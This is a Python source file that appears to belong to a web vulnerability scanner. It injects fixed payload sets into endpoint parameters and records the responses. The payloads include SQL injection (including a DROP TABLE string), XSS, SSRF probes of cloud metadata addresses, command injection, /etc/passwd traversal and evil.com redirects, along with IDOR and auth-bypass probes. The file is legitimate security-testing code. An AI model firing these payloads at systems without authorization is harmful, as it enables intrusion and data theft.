"""
Deterministic coverage scanner.

Tests ALL endpoints with ALL vuln types using fixed payload sets.
No LLM decisions in this phase — ensures reproducible coverage.
"""

from dataclasses import dataclass
from urllib.parse import urlparse, parse_qs, urlencode
import re

from senshi.core.session import Session
from senshi.reporters.models import Finding


# Fixed payload sets — same every run
PAYLOADS = {
    "sqli": [
        ("'", "single_quote"),
        ('"', "double_quote"),
        ("' OR '1'='1", "or_bypass"),
        ("'; DROP TABLE --", "stacked_query"),
        ("1 UNION SELECT NULL--", "union"),
    ],
    "xss": [
        ("<script>alert(1)</script>", "script_tag"),
        ('"><img src=x onerror=alert(1)>', "event_handler"),
        ("{{7*7}}", "ssti"),
        ("javascript:alert(1)", "js_protocol"),
    ],
    "ssrf": [
        ("http://169.254.169.254/latest/meta-data/", "aws_metadata"),
        ("http://metadata.google.internal/", "gcp_metadata"),
        ("http://100.100.100.200/latest/meta-data/", "alibaba_metadata"),
        ("http://127.0.0.1:80", "localhost"),
        ("http://[::1]", "ipv6_localhost"),
    ],
    "cmdi": [
        ("|| whoami", "or_operator"),
        ("| id", "pipe"),
        ("; id", "semicolon"),
        ("$(id)", "substitution"),
        ("`id`", "backtick"),
    ],
    "path_traversal": [
        ("../../../etc/passwd", "basic"),
        ("....//....//etc/passwd", "filter_bypass"),
        ("..%2f..%2f..%2fetc/passwd", "url_encoded"),
    ],
    "open_redirect": [
        ("https://evil.com", "external_https"),
        ("//evil.com", "protocol_relative"),
        ("/\\evil.com", "backslash_bypass"),
    ],
}


@dataclass
class TestResult:
    """Single test result."""
    endpoint: str
    method: str
    param: str
    vuln_type: str
    payload: str
    technique: str
    baseline_status: int
    baseline_body: str
    baseline_length: int
    baseline_content_type: str
    test_status: int
    test_body: str
    test_length: int
    test_content_type: str
    test_headers: dict


class CoverageScanner:
    """
    Deterministic scanner that tests everything.
    
    No LLM decisions here — just systematic testing.
    """
    
    def __init__(self, session: Session):
        self.session = session
        self.results: list[TestResult] = []
    
    def scan_all(self, endpoints: list) -> list[TestResult]:
        """
        Scan all endpoints with all applicable vuln types.
        
        Returns raw results for LLM analysis.
        """
        self.results = []
        
        for ep in endpoints:
            # Handle both DiscoveredEndpoint objects and dicts
            if hasattr(ep, "url"):
                url = ep.url
                method = ep.method
                params = ep.params
            else:
                url = ep.get("url", "")
                method = ep.get("method", "GET")
                params = ep.get("params", [])
            
            # Determine which vuln types to test based on endpoint
            vuln_types = self._get_applicable_vulns(url, params)
            
            for vuln_type in vuln_types:
                if vuln_type in ["idor", "auth", "info_disclosure"]:
                    # These don't use params
                    self._test_access_control(url, method, vuln_type)
                else:
                    # Injection vulns — test each param
                    for param in params:
                        self._test_injection(url, method, param, vuln_type)
        
        return self.results
    
    def _get_applicable_vulns(self, url: str, params: list[str]) -> list[str]:
        """Determine which vuln types apply to this endpoint."""
        applicable = []
        url_lower = url.lower()
        param_str = " ".join(params).lower() if params else ""
        
        # Always test if has params
        if params:
            applicable.extend(["sqli", "xss"])
        
        # SSRF: URL-like params
        if any(p in param_str for p in ["url", "uri", "link", "href", "src", "fetch"]):
            applicable.append("ssrf")
        
        # CMDi: command-like params
        if any(p in param_str for p in ["host", "ip", "cmd", "command", "exec", "ping"]):
            applicable.append("cmdi")
        
        # Path traversal: file-like params
        if any(p in param_str for p in ["file", "path", "doc", "page", "template"]):
            applicable.append("path_traversal")
        
        # Open redirect: redirect-like params
        if any(p in param_str for p in ["url", "redirect", "next", "return", "goto", "dest"]):
            applicable.append("open_redirect")
        
        # IDOR: has numeric ID in path
        if re.search(r'/\d+(/|$|\?)', url):
            applicable.append("idor")
        
        # Auth: sensitive endpoint
        if any(x in url_lower for x in ["/admin", "/manage", "/config", "/users", "/internal"]):
            applicable.append("auth")
        
        # Info disclosure: config-like endpoints
        if any(x in url_lower for x in ["/config", "/env", "/debug", "/info"]):
            applicable.append("info_disclosure")
        
        return list(set(applicable))
    
    def _test_injection(self, url: str, method: str, param: str, vuln_type: str):
        """Test injection vulnerabilities on a parameter."""
        payloads = PAYLOADS.get(vuln_type, [])
        if not payloads:
            return
        
        # Get baseline
        baseline = self.session.get(url)
        
        for payload_value, technique in payloads:
            # Inject payload
            test_url = self._inject_param(url, param, payload_value)
            response = self.session.get(test_url, allow_redirects=(vuln_type != "open_redirect"))
            
            self.results.append(TestResult(
                endpoint=url,
                method=method,
                param=param,
                vuln_type=vuln_type,
                payload=payload_value,
                technique=technique,
                baseline_status=baseline.status_code,
                baseline_body=baseline.body[:2000],
                baseline_length=len(baseline.body),
                baseline_content_type=baseline.headers.get("content-type", ""),
                test_status=response.status_code,
                test_body=response.body[:2000],
                test_length=len(response.body),
                test_content_type=response.headers.get("content-type", ""),
                test_headers=dict(response.headers),
            ))
    
    def _test_access_control(self, url: str, method: str, vuln_type: str):
        """Test access control vulnerabilities."""
        
        if vuln_type == "idor":
            self._test_idor(url, method)
        elif vuln_type == "auth":
            self._test_auth(url, method)
        elif vuln_type == "info_disclosure":
            self._test_info_disclosure(url, method)
    
    def _test_idor(self, url: str, method: str):
        """Test IDOR by changing numeric IDs."""
        # Find numeric segments
        parsed = urlparse(url)
        parts = parsed.path.strip("/").split("/")
        
        for i, part in enumerate(parts):
            if part.isdigit():
                original_id = int(part)
                
                # Get baseline
                baseline = self.session.get(url)
                
                # Test ID+1 and ID-1
                for test_id in [original_id + 1, max(0, original_id - 1), 1, 2]:
                    if test_id == original_id:
                        continue
                    
                    new_parts = parts.copy()
                    new_parts[i] = str(test_id)
                    new_url = f"{parsed.scheme}://{parsed.netloc}/{'/'.join(new_parts)}"
                    if parsed.query:
                        new_url += f"?{parsed.query}"
                    
                    response = self.session.get(new_url)
                    
                    self.results.append(TestResult(
                        endpoint=url,
                        method=method,
                        param=f"path_id_{i}",
                        vuln_type="idor",
                        payload=str(test_id),
                        technique=f"id_change_{original_id}_to_{test_id}",
                        baseline_status=baseline.status_code,
                        baseline_body=baseline.body[:2000],
                        baseline_length=len(baseline.body),
                        baseline_content_type=baseline.headers.get("content-type", ""),
                        test_status=response.status_code,
                        test_body=response.body[:2000],
                        test_length=len(response.body),
                        test_content_type=response.headers.get("content-type", ""),
                        test_headers=dict(response.headers),
                    ))
    
    def _test_auth(self, url: str, method: str):
        """Test missing authentication."""
        # With auth
        response_auth = self.session.get(url)
        
        # Without auth
        response_no_auth = self.session.get(url, skip_auth=True)
        
        self.results.append(TestResult(
            endpoint=url,
            method=method,
            param="",
            vuln_type="auth",
            payload="no_auth",
            technique="auth_bypass",
            baseline_status=response_auth.status_code,
            baseline_body=response_auth.body[:2000],
            baseline_length=len(response_auth.body),
            baseline_content_type=response_auth.headers.get("content-type", ""),
            test_status=response_no_auth.status_code,
            test_body=response_no_auth.body[:2000],
            test_length=len(response_no_auth.body),
            test_content_type=response_no_auth.headers.get("content-type", ""),
            test_headers=dict(response_no_auth.headers),
        ))
    
    def _test_info_disclosure(self, url: str, method: str):
        """Test for information disclosure."""
        response = self.session.get(url)
        
        self.results.append(TestResult(
            endpoint=url,
            method=method,
            param="",
            vuln_type="info_disclosure",
            payload="",
            technique="response_analysis",
            baseline_status=response.status_code,
            baseline_body="",
            baseline_length=0,
            baseline_content_type="",
            test_status=response.status_code,
            test_body=response.body[:5000],  # More body for secrets scanning
            test_length=len(response.body),
            test_content_type=response.headers.get("content-type", ""),
            test_headers=dict(response.headers),
        ))
    
    def _inject_param(self, url: str, param: str, value: str) -> str:
        """Inject payload into URL parameter."""
        parsed = urlparse(url)
        query = parse_qs(parsed.query, keep_blank_values=True)
        query[param] = [value]
        new_query = urlencode(query, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
